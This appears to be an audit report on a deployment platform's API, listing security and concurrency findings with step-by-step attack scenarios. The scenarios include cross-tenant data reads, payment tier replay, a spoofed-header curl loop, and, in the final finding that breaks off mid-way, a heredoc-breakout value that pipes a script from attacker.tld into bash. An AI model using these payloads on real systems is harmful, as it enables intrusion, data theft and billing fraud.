findings.failure_scenario: `getDb()` (line 854) is Deployify's OWN control-plane Firestore admin handle from `src/lib/firebase.ts` — there is no per-tenant credential for the `firestore` connector type. Any signed-up user creates a project, then POSTs to /api/projects/{own-id}/storage with `{"type":"firestore","name":"x"}`. `src/app/api/projects/[id]/storage/route.ts:88` only checks `if (!type || !name)` — `type` has no allowlist — and because `provision` is falsy the config is persisted with `status = 'active'` (line 92 default). The attacker then POSTs to /api/projects/{own-id}/storage/{storageId}/query with `{"query":"{\"collection\":\"users\",\"limit\":500}"}`. `checkProjectAccess` passes (it is their own project), `collection` is interpolated straight into `db.collection()`, and 500 documents of the platform `users` collection are returned in the JSON response. Repeating with `"collection":"projects"` returns every tenant's project document including `envVariables` (non-secret values are stored in cleartext per src/app/api/projects/[id]/env/route.ts:121 `const storedValue = isEncrypted ? encrypt(value) : value`), `analyticsApiKey`, and `storageConfigs`. The `where` array (line 901-906) is equally unvalidated and lets the attacker page past MAX_ROWS by filtering on document fields.
findings.impact: Full cross-tenant read of the platform control plane — all users, all projects, all environment variables and analytics API keys — from an ordinary free account, with no exploit primitive beyond a JSON string.
findings.checked_mitigations: Grepped the route for getSession/checkProjectAccess — both present but they only authorize access to the attacker's OWN project id, not to the Firestore collection being read. Grepped for an allowlist of collection names (`Collections.` is imported but never used to validate `collection`). Grepped src/app/api/projects/[id]/storage/route.ts for validation of `type` against a whitelist — none exists; only `if (!type || !name)` at line 88. Confirmed `getDb` is the firebase-admin platform handle (src/lib/firebase.ts) and is not re-bound to a tenant project for the `firestore` branch.

findings.title: Attacker-controlled object keys are interpolated raw into `new RegExp` in the Data Lab query route, giving full regex injection and catastrophic backtracking
findings.impact: Any authenticated user can permanently wedge a shared Cloud Run instance's event loop with one small request, denying service to every other tenant on that instance. Also a general regex-injection primitive over the query text.
findings.checked_mitigations: Checked for any escaping helper applied to `name`/`key` before interpolation — there is none anywhere in the file (grep 'escapeRegExp|replace(/[.*+?' returns nothing in the repo). Checked whether `variables` is validated: it is destructured at line 26 with only a `= {}` default. Confirmed the substitution block precedes the read-only enforcement at line 135 and the credential fetch at line 173, so authorization to a real database is not required. No timeout wraps this section — the 25s `timeoutPromise` at line 197 is created after it and cannot interrupt synchronous regex work anyway.

findings.title: Public reverse proxy buffers whole request and response bodies into memory with no size cap, no fetch timeout, and no rate limiting at all
findings.failure_scenario:
Three compounding problems on the only unauthenticated, internet-facing data path.
(1) Rate limiting never runs here: src/proxy.ts returns the subdomain rewrite at line 109 (`return NextResponse.rewrite(url, ...)`) BEFORE the `if (pathname.startsWith('/api/'))` rate-limit block at line 115, so every request to `https://<any-project-slug>.deployify.io/...` reaches this handler unmetered.
(2) Line 142 reads the entire request body into a single ArrayBuffer on the Node heap. `next.config.ts` sets `bodySizeLimit: '2mb'` only under `experimental.serverActions`, which does not apply to route handlers. A single `curl -X POST --data-binary @2GB.bin https://slug.deployify.io/` allocates 2GB in the handler; a Cloud Run instance with the common 512Mi limit OOMs and is killed, dropping every in-flight request for every tenant on it. Lines 182/207 do the same for the response side.
(3) Line 164 calls fetch with no `signal`/AbortSignal. A slow or hung target Cloud Run app holds the buffered body and the connection open until the platform request timeout (up to 60 minutes on Cloud Run), so slowloris-style concurrency exhausts the instance's request slots.
Each HTML GET also performs an unmetered Firestore write plus a BigQuery streaming insert via `logEdgeEvent` (line 179 -> lines 44-52), and every request costs at least one Firestore read in `resolveProject` (`getProjectBySlugGlobal`, src/lib/db.ts:671, uncached), so a flood is also a direct billing amplification against the platform.
findings.impact: Unauthenticated remote memory exhaustion and connection exhaustion of shared Cloud Run instances, plus unmetered Firestore/BigQuery write amplification billed to Deployify.
findings.checked_mitigations: Read src/proxy.ts end-to-end and confirmed the rewrite at line 109 short-circuits before the rate limiter at line 115 — subdomain traffic is never rate limited. Grepped the route for AbortSignal/AbortController/timeout — none. Grepped next.config.ts for any body size configuration — only `experimental.serverActions.bodySizeLimit`, which does not govern route handlers. Confirmed `getProjectBySlugGlobal` (src/lib/db.ts:671-690) performs a live Firestore query with no cache layer.

findings.title: Cloud SQL machine `tier` and HA flag are taken unvalidated from the request body and there is no provisioning quota anywhere
findings.failure_scenario: Any signed-up user creates a project (they are owner, so `checkProjectAccess` passes and `access.role !== 'viewer'`) and POSTs to /api/projects/{id}/storage with `{"type":"cloud-sql-postgres","name":"a1","provision":true,"region":"us-central1","metadata":{"tier":"db-custom-96-624000","highAvailability":true,"pitrEnabled":true}}`. `metadata.tier` is never checked against an allowlist and flows into the Cloud SQL Admin API call at cloudsql.ts:51 using Deployify's own service-account token (`getGcpAccessToken()`), creating a 96-vCPU / 624GB regional HA instance in the PLATFORM's GCP project — roughly USD 10k+/month per instance. `region` is equally unvalidated. Nothing rate-limits or caps this: `checkUsageLimits` from src/lib/billing/caps.ts is imported by exactly one file (src/app/api/projects/[id]/deploy/route.ts:5) and never by any storage route, and `TIERS[...].limits` (src/lib/billing/tiers.ts:27) is read only by the billing UI and the usage-alert tracker, never as a gate. The same unvalidated tier reaches read-replica creation at src/app/api/projects/[id]/storage/[storageId]/replica/route.ts:58 (`const tier = body.tier || ...`). The default proxy.ts limit is 100 req/min/IP/instance, so a script can request dozens of these per minute.
findings.impact: Unbounded financial denial of service: a free-tier account can provision arbitrarily large GCP resources billed to the platform, and can exhaust the platform GCP project's Cloud SQL instance quota so no legitimate tenant can provision.
findings.checked_mitigations: Grepped all of src/lib and src/app/api for `quota|checkPlanLimit|enforceQuota|maxProjects` — zero hits. Grepped for importers of '@/lib/billing/caps' — only src/app/api/projects/[id]/deploy/route.ts. Grepped for `limits.projects|limits.deployments|limits.buildMinutes` — only UI (src/app/billing/page.tsx), pricing math, and alert emails (src/lib/billing/tracker.ts:148), never a rejection. Confirmed the viewer role check at line 74 is the only authorization gate and it does not apply to a project's own owner.

findings.title: Razorpay payment verification trusts a client-supplied `tierId` that is not covered by the signature
findings.failure_scenario: `verifyPaymentSignature` only HMACs `orderId|paymentId`; `tierId` is outside the signed material and is never compared against the order's `notes.tierId` (which checkout DOES set at src/app/api/billing/checkout/route.ts:79). A user completes a genuine 1500 INR 'pro' checkout, then replays the browser's own verify call with the body changed to `{"orderId":"<real>","paymentId":"<real>","signature":"<real>","tierId":"enterprise"}`. The signature validates, and line 41 writes `tier: 'enterprise'` to the user document and re-mints the session cookie with it (lines 52-58). `tierId` is also not checked against TIERS at all here, so `"tierId":"free"` or any arbitrary string is written verbatim into the subscription. There is additionally no idempotency/one-use check on `orderId`, so the same signed triple can be replayed indefinitely to keep extending `currentPeriodEnd` by 30 days.
findings.impact: Pay the cheapest tier, receive the most expensive one, and renew forever from a single payment — direct revenue loss, and the escalated tier is what the rest of the system reads for entitlements.
findings.checked_mitigations: Read src/lib/billing/payments.ts:47-61 and confirmed the HMAC covers only orderId and paymentId. Grepped the verify route for any `TIERS[` lookup or comparison to the order's notes — none; the route never re-fetches the order from Razorpay. Checked src/app/api/billing/webhook/route.ts:37 which does correctly read `tierId` from the order `notes`, confirming the intended binding exists but is bypassed by this client-driven path.

findings.title: All rate limiting is per-instance in-memory keyed on a spoofable X-Forwarded-For, with stores that never shrink, and the shared `checkRateLimit` helper is dead code
findings.failure_scenario:
Three independent defects in one mechanism.
(1) Bypass: on Cloud Run the front end APPENDS the caller's IP to an existing X-Forwarded-For header rather than replacing it, so `.split(',')[0]` returns the value the ATTACKER sent. `for i in $(seq 1 100000); do curl -H "X-Forwarded-For: 1.2.3.$((RANDOM%255))" https://app/api/auth/github; done` gets a fresh 30-request bucket per header value — the 'strict' 30/min auth limit (proxy.ts:122) is nullified, as is the 20/min analytics limit at collect/route.ts:53.
(2) Multi-instance: both Maps are process-local. Cloud Run autoscales, so the effective limit is 100 x N instances and simply raising concurrency spreads a flood across instances that cannot see each other's counters.
(3) Unbounded growth: neither store is ever cleaned. proxy.ts keys on `${ip}:${pathname}` and the rate-limit branch fires for ANY path under /api/, including non-existent ones, so `GET /api/<random-uuid>` inserts a permanent entry per request. A few million requests (or a few million spoofed XFF values against collect/route.ts:58) grows the Map past the instance memory limit and the container is OOM-killed. src/lib/security/index.ts at least attempts cleanup (`if (Math.random() < 0.01) cleanupExpiredEntries()` at line 20) — but that function is imported by no route in the codebase, so it protects nothing.
findings.impact: Every rate limit in the product is bypassable with one spoofed header, which re-opens credential stuffing on /api/auth/*, unmetered analytics ingestion, and unmetered access to the expensive endpoints elsewhere in this report; the same header also drives an unauthenticated memory-exhaustion primitive against every instance.
findings.checked_mitigations: Grepped the entire repo for `checkRateLimit` — only the definition in src/lib/security/index.ts:11 and the private duplicate in src/proxy.ts:23; no API route imports it. Grepped for Redis/Firestore-backed limiting (`ioredis` is a dependency but is only used for user-owned Memorystore connectors in the storage routes, never for rate limiting). Grepped both stores for `.delete(`/cleanup — proxy.ts and collect/route.ts have none. Checked whether a trusted-proxy hop count or `request.ip` is used instead of the raw header — it is not.

findings.title: Analytics collector accepts an unbounded, untyped payload and a hardcoded bypass API key, then writes it to Firestore and streams it to BigQuery
findings.failure_scenario: The route is public (no session, and src/proxy.ts does not gate /api/v1/*). Line 66 accepts the literal string 'deployify-dashboard-internal' as a universal credential — it is shipped to browsers, so anyone can read it — meaning no valid project key is needed at all. None of `type`, `path`, `referrer`, `width` or `metrics` is type-checked or length-checked, and `metrics` is an arbitrary nested object written verbatim. An attacker POSTs `{"apiKey":"deployify-dashboard-internal","metrics":{"x":"<900KB string>"}}` in a loop with a randomized X-Forwarded-For header (which defeats the 20/min counter at line 53 as described in the rate-limiting finding). Each request creates a ~1MB Firestore document AND a BigQuery streaming insert. 100 req/s sustains ~100MB/s of Firestore writes plus BigQuery streaming-insert charges, all billed to the platform, and pollutes the analytics dataset for the 'deployify-dashboard' project. A `metrics` object nested past Firestore's 20-level limit instead throws, taking the 500 path on every request.
findings.impact: Unauthenticated, unmetered write and cost amplification against the platform's Firestore and BigQuery, plus permanent corruption of the analytics dataset.
findings.checked_mitigations: Grepped the route for getSession/requireAuth — none; it is intentionally public but relies solely on the apiKey check, which line 66 short-circuits. Confirmed src/proxy.ts explicitly lets /api/v1/collect through the subdomain rewrite (line 101) and applies only the generic 100/min IP bucket on the base domain. Confirmed no field length/type validation exists between line 26 and the Firestore write at line 93. Confirmed `streamEventToBigQuery` is fire-and-forget (`.catch` only, line 102) so failures do not throttle the loop.

findings.title: Team invite passes an unvalidated `email` value straight to Resend, which accepts an array of recipients
findings.failure_scenario: The only check on `email` is falsiness — no `typeof`, no format regex. `SendEmailOptions.to` is typed `string` but that is erased at runtime and the value originates from `await request.json()`. Resend's `emails.send` accepts `string | string[]` (up to 50 recipients per call). A user creates their own team (they are automatically owner, satisfying the owner/admin check at line 38) and POSTs `{"email":["victim1@x.com", ... 50 addresses ...],"role":"member"}`. Resend delivers the invite HTML to all 50 arbitrary third parties, `from` = the platform's verified sending domain (config.email.fromAddress). The generic proxy.ts bucket allows 100 such requests per minute per IP per instance — and that bucket is itself bypassable per the rate-limiting finding — so this is a 5,000+ messages/minute open relay. `role` is validated against a list at lines 55-60 but `email` is not, and each call also writes an invite document via `createInvite` with the array as the stored email.
findings.impact: The platform's verified sending domain and Resend quota become a spam relay: deliverability damage, domain blacklisting, and Resend account suspension, plus unbounded invite documents in Firestore.
findings.checked_mitigations: Grepped the route for any email-format validation or `typeof email !== 'string'` guard — there is none; line 48 is a bare falsiness check. Read src/lib/email/client.ts end-to-end: `to` is forwarded to Resend with no normalization or runtime type check (line 44). Checked whether an authorization gate blocks this — lines 36-43 require owner/admin, but a user is owner of any team they create themselves, so it is not a barrier. Checked src/proxy.ts:46-49 `strictRateLimitRoutes` — it covers only /api/auth/ and /api/webhooks/, not /api/teams/.

result.coverage_notes:
SWEPT: all 84 route.ts files under src/app/api (43 consume a JSON body); src/lib/security/index.ts; src/proxy.ts; src/app/api/v1/collect/route.ts; src/app/api/v1/proxy/[slug]/[[...path]]/route.ts (read end-to-end); the full 1000-line Data Lab query route; src/lib/utils/masking.ts; src/lib/logging/parser.ts + tracker.ts; src/lib/gcp/cloudsql.ts createInstance; src/lib/billing/{payments,tiers,caps}.ts; src/lib/email/client.ts; next.config.ts.

VALIDATION COVERAGE QUANTIFIED: there is no schema-validation library in package.json (no zod/valibot/yup/joi/ajv). Of the 43 route files that call req.json()/request.json(), 22 contain ZERO runtime type checks of any kind (no `typeof`, no `Array.isArray`, no regex `.test()`, no `instanceof`) — including billing/checkout, billing/verify, invites/accept, teams/[id]/invite, teams/[id]/members/[userId], every storage backup/restore/branch/cutover/export/import/ingest/migrations/dashboards route, and v1/collect. Another 10 have exactly one such check. Validation, where it exists, is ad hoc presence checking (`if (!x) return 400`), which is why type-confusion (array where a string is expected) and unbounded-value bugs recur.

RATE LIMITING SUMMARY: three separate implementations. src/lib/security/index.ts `checkRateLimit` is exported but imported by ZERO routes — dead code, and it is the only one with any cleanup (Math.random()<0.01). src/proxy.ts has a private duplicate with no cleanup at all, and its store is only consulted after the subdomain-rewrite early return, so all public project traffic is unlimited. src/app/api/v1/collect/route.ts has a third, also with no cleanup. All three key on the attacker-controlled first element of X-Forwarded-For and all three are per-process, which is meaningless on autoscaled Cloud Run.

ALSO CONFIRMED BUT NOT REPORTED (below the bar or dominated by a reported finding): (a) src/app/api/projects/[id]/storage/[storageId]/export/pdf/route.ts:24-120 takes an unbounded `results` array from the body and renders every row through pdfkit while accumulating chunks in the heap — a real CPU/heap bomb for any project member including viewers (no role check), but it is a strict subset of the "no body size limit anywhere" problem already covered by findings 3 and 4; (b) the same PDF route dereferences `storageName.toUpperCase()` with no guard (line 45) — undefined input yields a 500, cosmetic; (c) src/app/api/projects/[id]/deployments/route.ts:37-38 `parseInt(limitParam,10)` is unvalidated and feeds Firestore `.limit()` plus an unbounded `Promise.all` fan-out at line 49 — but the read is bounded by the project's actual deployment count, so it is not usefully amplifiable; (d) MongoDB `filter` at query/route.ts:775-781 is passed raw to `find()` (operator injection incl. `$where`) but only against the user's OWN database; (e) the email regex in masking.ts is quadratic-backtracking but only ever runs over the user's own query results (grep confirmed maskData has exactly two call sites); (f) env var `value` (env/route.ts:88) has no length cap, so a ~900KB value can push a project document past Firestore's 1MB limit and brick further writes to that project.

NOT COVERED: I did not dynamically execute anything (no requests issued, no tests run); Cloud Run's exact X-Forwarded-For append behavior in this specific deployment is asserted from GCP's documented front-end behavior, not observed. I did not audit src/components, the CLI under src/cli, or scripts/. I did not review src/app/api/webhooks/github (HMAC verification looked correct on read) or the GitHub OAuth callback in depth, as those fall under the auth dimension.

findings.title: Every successful deployment — including PR previews and branch builds — overwrites project.productionUrl, so the public reverse proxy starts serving the preview build
findings.failure_scenario: A contributor opens PR #42. src/app/api/webhooks/github/route.ts:562 computes `projectSlug = getProjectSlugForDeployment(project, deployment)` = `myapp-pr-42` and passes it to `pollBuildStatus(...)` (line 600-614). When the preview build succeeds, syncDeploymentStatus builds `serviceName = dfy-myapp-pr-42`, resolves its Cloud Run URL, and then executes `updateProject(projectId, { productionUrl: 'https://dfy-myapp-pr-42-....run.app' })`. The same happens for any non-default branch push (deploy/route.ts:120 sets type 'branch', slug becomes `myapp-feature-x`). src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:91-103 resolves the public site by reading `project.productionUrl` and proxies every request there, so from that moment the project's public entry point serves the unreviewed PR build. The dashboard 'Visit' link (src/app/dashboard/[id]/page.tsx:236) and the analytics site-id derivation (analytics/page.tsx:54-63) also switch to the preview URL. The value is never restored until the next *production* deploy succeeds.
findings.impact: Unreviewed preview/branch code is served to real end users through the project's public proxy URL, and analytics are attributed to the wrong origin. A PR from any collaborator silently replaces production.
findings.checked_mitigations: grep -rn 'productionUrl:' src/lib src/app/api shows the only real write is src/lib/deployment.ts:137 (plus the simulation at :400) — there is no compensating write that restores it. syncDeploymentStatus does branch on deployment.type, but only for the database-branching block at line 171 (`if (deployment.type === 'preview' && pullRequestNumber)`), proving the type is available at that point and simply is not consulted for the productionUrl write. The proxy route has no deployment-type filter either.

findings.title: syncDeploymentStatus has no idempotency guard, and three independent pollers race it — duplicate usage-quota increments, duplicate emails, duplicate PR comments
findings.failure_scenario: The check at line 40 is a check-then-act on a value read from Firestore with no lock, lease, or transaction, and the terminal write happens ~1-3 s later (after getBuildStatus, getCloudRunServiceUrl, getGcpProjectNumber, getService). Three callers hit the same deployment concurrently while it is building: (a) src/app/dashboard/[id]/deployments/page.tsx:50 polls GET /api/projects/[id]/deployments every 5 s, which calls syncDeploymentStatus for every active deployment (deployments/route.ts:48-70); (b) src/components/DeploymentLogsModal.tsx:54 polls GET .../deployments/[deployId]/logs every 3 s, which calls syncDeploymentStatus for the same deployment (logs/route.ts:37-56); (c) the in-process `setTimeout(poll, 30000)` chain in deployment.ts:342. With the logs modal open on the deployments page, two requests land inside the same 3 s window in which the build flips to SUCCESS. Both read status 'building', both pass line 40, and both run the SUCCESS branch: `trackDeployment` (billing/tracker.ts:29-37) fires `FieldValue.increment(1)` on totalDeployments and increments totalBuildMinutes twice; two 'Deployment Success' emails are sent (line 158); two identical '🚀 Deploy Preview Ready!' PR comments are posted (line 209); two Discord/Slack webhook messages fire (line 245 on the failure path).
findings.impact: Usage counters that gate paid tiers are inflated (a user is charged for 2 deployments and 2x build minutes for one build), and customers receive duplicate notification emails, duplicate PR comments, and duplicate chat webhooks on every raced build completion.
findings.checked_mitigations: grep -rn 'runTransaction' src/ returns only the mock shim in src/lib/firebase.ts:245 — no Firestore transaction is used anywhere in the app. There is no 'notified'/'processed' flag on the deployment document (updateDeployment at db.ts:1266 is a plain .update()), and no conditional write/precondition. trackDeployment uses FieldValue.increment, which makes each call atomic but does NOT make the caller idempotent — that is exactly why the double call double-counts.

findings.title: Automated PlanetScale token rotation runs from an unguarded GET and deletes every other 'deployify-rotation-*' password, so two overlapping syncs revoke the credential that is live in Secret Manager
findings.failure_scenario: The trigger is src/app/api/projects/[id]/storage/[storageId]/sync/route.ts:446-457: `if (daysSinceRotation >= 30 && (storage.type === 'neon' || storage.type === 'planetscale')) { const rotateResult = await rotateProviderToken(id, storage); ... storage.lastRotatedAt = now; ... await updateProject(...) }`. The `lastRotatedAt` guard is only persisted AFTER the whole multi-second rotation finishes, and the handler is a plain GET with no lock. Two overlapping sync calls (two dashboard tabs, a double-clicked Sync button, or handleUpdateBackupPolicy at StorageSection.tsx:825 firing while a manual sync at :592 is in flight) both read lastRotatedAt > 30 days and both rotate. Interleaving: A creates password A; B creates password B; B writes conn-string B to Secret Manager; B's cleanup deletes password A; A then writes conn-string A over B's (line 582); A's cleanup deletes password B. Final state: Secret Manager holds credentials for password A, which PlanetScale has already deleted, and password B is gone too. Every Cloud Run revision that mounts this secret (cloudbuild.ts:388-399 --set-secrets) fails authentication on its next connection/cold start.
findings.impact: Total, self-inflicted database outage for the deployed application, requiring manual credential recovery in the PlanetScale console. The rotation is fully automatic (30-day timer), so it fires without any user action.
findings.checked_mitigations: Searched sync/route.ts for any mutex/lease/in-progress flag around the rotation block — there is none; the only guard is the post-hoc `storage.lastRotatedAt = now` write at line 450. grep -rn 'runTransaction' src/ confirms no transactional compare-and-set exists. The cleanup filter excludes only `newPwd.id`, so it provably deletes a concurrently created sibling password rather than skipping it.

findings.title: Concurrent replica creation loses one write to the storageConfigs array, leaving a paid Cloud SQL read replica running, untracked and undeletable
findings.failure_scenario: `storageConfigs` comes from `checkProjectAccess` (line 33), i.e. a plain document read, and `updateProject` (src/lib/db.ts:1117-1123) is a plain `.update()` that replaces the whole array — a textbook read-modify-write with no precondition. Two admins (or one admin and the auto-align/failover writer in sync/route.ts:184) click 'Create replica' within the ~30 s window that `createReadReplica` takes: both read the array at t0, both call the Cloud SQL API and get real replicas `mydb-replica-a1b2` and `mydb-replica-c3d4` created, then A writes [.. replicas:[A]] and B writes [.. replicas:[B]]. A's entry is gone. The DELETE handler in the same file (line 168-178) can only delete replicas found in `storage.metadata.replicas`, so `mydb-replica-a1b2` can never be removed through the product. The same lost-update pattern applies to every one of the ~20 routes that rewrite the whole storageConfigs array (migrate-region/route.ts:57, backups/route.ts:145, export/route.ts:67, import/route.ts:71, sync/route.ts:282 …).
findings.impact: A billable Cloud SQL read replica (db-custom tiers run tens to hundreds of USD/month) runs forever, invisible in the dashboard and unreachable by the delete endpoint. More generally, any two concurrent storage operations on one project silently discard one another's state.
findings.checked_mitigations: grep -rn 'runTransaction|FieldValue.arrayUnion' src/ finds no transaction and no arrayUnion anywhere — only FieldValue.increment in billing/tracker.ts. src/lib/db.ts:1117 confirms updateProject does an unconditional `.update()`. The 'purge orphans' path (src/app/api/gcp/discover/route.ts:97) cannot help: src/lib/gcp/discovery.ts:92-93 only flags a resource orphaned when `item.name.includes('-pr-') || item.name.includes('-branch-')`, and a replica is named `<master>-replica-<suffix>`, so it is never flagged.

findings.title: No serialization or supersede-cancel between builds of the same project: an older commit's build can win the Cloud Run traffic race and the newer deployment records the wrong revision
findings.failure_scenario: Two commits are pushed to main 30 s apart (or a user clicks Deploy twice). handlePushEvent (webhooks/github/route.ts:129-194) creates and submits build #1 for commit A, then build #2 for commit B; both target the identical service name `dfy-<slug>` (generateServiceName on the same production slug) and Cloud Build runs them in parallel. Build durations vary by minutes depending on Docker layer/GCS cache hits (cloudbuild.ts:216-221 restores a cache both builds share and both overwrite at gs://<bucket>/<projectSlug>.tgz). If build A finishes last, its `gcloud run deploy` + `update-traffic --to-latest` puts commit A's revision at 100%, so production serves the OLDER commit while the dashboard shows deployment B as the newest 'ready' one. Independently, deployment.ts:92-95 records `latestRevision = service.latestReadyRevision` read at sync time rather than the revision this build produced, so deployment B's row can store A's revision name; a later rollback to B (deployments/[deployId]/rollback/route.ts:47 → updateTraffic) then routes traffic to the wrong code.
findings.impact: Silent production regression — the platform reports the newest commit as live while serving an older one — plus corrupted deployment→revision mapping that makes rollback target the wrong build.
findings.checked_mitigations: grep -rn "status === 'building'" across src/app/api shows the only matches are the read-only freshness filters in projects/[id]/route.ts:49, deployments/route.ts:45 and logs/route.ts:38 — there is no guard that rejects or supersedes a deploy while another is in flight, and no call to cancelBuild on a prior build (cancelBuild is only reachable from the manual DELETE at deploy/route.ts:354). Cloud Build applies no per-service serialization; the config sets no concurrency/queue option (cloudbuild.ts:511-517, 531-537).

findings.title: Completing a Cloud SQL regional migration overwrites resourceName with the clone and abandons the source instance, which is then billed forever with no reference to it anywhere
findings.failure_scenario: migrateInstanceToRegion (src/lib/gcp/cloudsql.ts:718-762) is a Cloud SQL *clone*: it creates a brand-new instance named `${instanceName}-${targetRegion}` and leaves the source instance running. It is triggered either by POST .../migrate-region (route.ts:44) or automatically by the auto-align block in this same sync GET (sync/route.ts:161-185, which fires whenever `storage.autoAlign` is set and the connector's region differs from the project's). When the clone operation reports DONE, the block above repoints `resourceName` at the clone and deletes `targetInstanceName` from metadata. The original instance `myapp-db` is now referenced by nothing in Firestore: the connection-string secret is rewritten to the clone (line 733-736), and no code path deletes it. A user who flips autoAlign on a db-custom-2-7680 instance silently ends up paying for two identical Cloud SQL instances indefinitely.
findings.impact: Permanent duplicate Cloud SQL billing (easily 100+ USD/month per migrated instance) plus an abandoned instance still holding customer data, with no UI or API able to find or remove it.
findings.checked_mitigations: grep -rn 'deleteInstance' src/ shows the only callers are the replica DELETE handler (replica/route.ts:178), the storage delete route, and the manual discover purge (api/gcp/discover/route.ts:97) — none of them runs after a migration and none knows the old name. src/lib/gcp/discovery.ts:92-93 only marks a resource `isOrphaned` when its name contains '-pr-' or '-branch-', so a plainly named source instance is never surfaced for purge. The failover_promotion branch at line 750-772 has the same shape (old primary abandoned).

findings.title: pruneProjectImages deletes tagged Artifact Registry versions without force=true and never inspects the response, so image pruning is a silent no-op and the registry grows without bound
findings.failure_scenario: Every image this platform pushes carries tags: cloudbuild.ts:93-94 builds `<...>/<serviceName>:<commitSha7>` and `<...>/<serviceName>:latest`, and both are pushed (steps at cloudbuild.ts:300-308). The Artifact Registry versions.delete endpoint refuses to delete a version that still has tags unless `?force=true` is supplied, returning FAILED_PRECONDITION. This call omits `force` entirely and, unlike the sibling deleteProjectImages (artifacts.ts:31-35, which at least checks `response.ok`), never looks at the response, so every rejection is discarded. The caller is fire-and-forget with a catch that can therefore never fire (deployment.ts:141-143: `pruneProjectImages(serviceName, 10, projectRegion).catch(...)`). A project deploying 20x/day with a 1 GB image accumulates ~600 GB of Artifact Registry storage per month while operators believe only 10 versions are retained. Even in the branch where the API would accept the delete, a non-2xx response (403 on a missing artifactregistry.versions.delete permission, 429 on quota) is equally invisible.
findings.impact: Unbounded, silently growing Artifact Registry storage cost on every project, and a retention guarantee ('keep 10') that the code never actually enforces or reports on.
findings.checked_mitigations: Searched artifacts.ts end to end: no `force` query parameter is built anywhere and no other prune/GC path exists. grep -rn 'pruneProjectImages' src/ shows the single caller in deployment.ts:141 wrapped in .catch, which only catches the surrounding try/catch's rethrow — but the function swallows everything in its own try/catch at artifacts.ts:98-100 as well, so no failure ever reaches a log with actionable detail.

findings.title: Public analytics ingest keeps an in-memory rate-limit Map that is never pruned and is keyed on the caller-controlled X-Forwarded-For prefix
findings.failure_scenario: /api/v1/collect is the unauthenticated public ingest endpoint used by public/deployify-insights.js, so anyone can POST to it. Cloud Run appends to X-Forwarded-For rather than replacing it, so `split(',')[0]` is the value the *caller* supplied. An attacker (or simply a large volume of real IPv6 visitors, where masking only zeroes the last hextet at line 39-41) sends requests with a fresh X-Forwarded-For each time; each distinct value inserts a permanent entry into rateLimitMap. Nothing ever deletes entries — there is no TTL sweep, no size cap, and no eviction anywhere in the file — so the Map grows for the entire lifetime of the container until the Cloud Run instance exceeds its memory limit and is OOM-killed, dropping every in-flight request on that instance. The same forged header simultaneously resets the 20-req/min counter, so the rate limiter provides no back-pressure while the leak runs.
findings.impact: Remote, unauthenticated memory-exhaustion of the control-plane service (which also serves the dashboard and the public reverse proxy), plus a rate limiter that is trivially bypassed and therefore cannot slow the attack down.
findings.checked_mitigations: Read the whole route: no cleanup, no LRU, no max-size check, and the Map is module scope so it persists across requests. Contrast with the other limiter in src/lib/security/index.ts:19-22, which does sweep (`if (Math.random() < 0.01) cleanupExpiredEntries();`) — that mitigation exists in the codebase but is deliberately not used here, and checkRateLimit is never called from this route. No proxy-level or middleware rate limit covers /api/v1/collect (grep for checkRateLimit shows no call from src/proxy.ts for this path).

result.coverage_notes:
Swept for reliability/concurrency/correctness defects (explicitly excluding pure authz/security issues, which I left to the security dimension). Files read end-to-end: src/lib/deployment.ts, src/lib/gcp/cloudbuild.ts, src/lib/gcp/cloudrun.ts, src/lib/gcp/artifacts.ts, src/app/api/projects/[id]/deploy/route.ts, .../deployments/route.ts, .../deployments/[deployId]/{logs,alias,rollback}/route.ts, .../rollback/route.ts, src/app/api/webhooks/github/route.ts, src/app/api/v1/collect/route.ts, src/app/api/v1/proxy/[slug]/[[...path]]/route.ts, and the storage routes replica/{,promote}, backups, cutover, migrate-region, plus src/app/api/projects/[id]/storage/[storageId]/sync/route.ts (1128 lines, read in full across the health/metrics/recovery/operation-completion sections). Also read src/lib/billing/{tracker,caps}.ts, src/lib/gcp/{discovery,external-sync,cloudsql excerpts}.ts, src/lib/db.ts (updateProject/updateDeployment/getEnvVarsForDeployment), src/lib/security/index.ts, src/lib/utils.ts helpers, and the polling UI (dashboard/[id]/deployments/page.tsx, DeploymentLogsModal.tsx, StorageSection.tsx).

Repo-wide sweeps performed: `runTransaction|FieldValue.arrayUnion|FieldValue.increment` (only increment, in billing/tracker.ts — the whole app has zero Firestore transactions), module-level mutable state / setInterval / globalThis, `deleteInstance` callers, `productionUrl` writers, `syncDeploymentStatus|pollBuildStatus` callers, and `'provisioning'` state transitions.

Things I looked at and deliberately did NOT report, so they are not re-investigated: (1) the setTimeout-based pollBuildStatus chain surviving Cloud Run CPU throttling — real, but genuinely mitigated by the lazy syncDeploymentStatus calls on three GET routes; (2) N+1 sequential Secret Manager fetches in getEnvVarsForDeployment (db.ts:255-400) and getMonthlyUsage's per-project Monitoring calls — only on the deploy path, not hot enough; (3) JSON.parse of the GitHub webhook body (webhooks/github/route.ts:46) — inside the outer try/catch; (4) the StorageSection metrics useEffect re-creating its 60 s interval on every state change (StorageSection.tsx:731-746) — jittery but self-correcting; (5) Cloud Build statuses INTERNAL_ERROR and EXPIRED skipping the failure branch in deployment.ts:221 (no errorMessage, no email/webhook/PR comment, GitHub commit status stuck 'pending') — a real medium-severity gap that just missed the 8-finding cap, worth fixing alongside finding #2.

Not covered (out of assigned scope or not reachable in the time budget): billing webhook idempotency (src/app/api/billing/webhook/route.ts), the Razorpay/Stripe reconciliation paths, src/lib/gcp/monitoring.ts (1133 lines), storage-validator.ts, ingestion.ts orchestrateCutover internals, the crons/scheduler write paths, and the ~60 other storage sub-routes that share the same whole-array storageConfigs read-modify-write pattern documented in finding #4. I also did not run tests or lint (baseline was pre-measured). Several routes in the storage tree lack a role check that their siblings have (rollback/route.ts, migrate-region/route.ts, backups GET/POST/PATCH allow 'viewer' where deploy/route.ts:44 and env/route.ts:72 reject it) — flagged here only as a pointer, since authorization belongs to another dimension.

findings.title: Unvalidated `rootDirectory` bypasses its own sanitizer and breaks out of the Cloud Build heredoc, giving any signed-up user shell in the platform's Cloud Build step
findings.failure_scenario:
Any self-signup user creates a project (POST /api/projects, src/app/api/projects/route.ts:75 destructures `rootDirectory = ''` from the body with zero validation — `grep -n "test(|/^" src/app/api/projects/route.ts` returns nothing), or PATCHes an existing one (src/app/api/projects/[id]/route.ts:132 lists 'rootDirectory' in allowedFields and applies no content check). They set rootDirectory to the multi-line value:
    app
EOFMARKER
curl -sL http://attacker.tld/x.sh | bash
: <<'EOFMARKER'
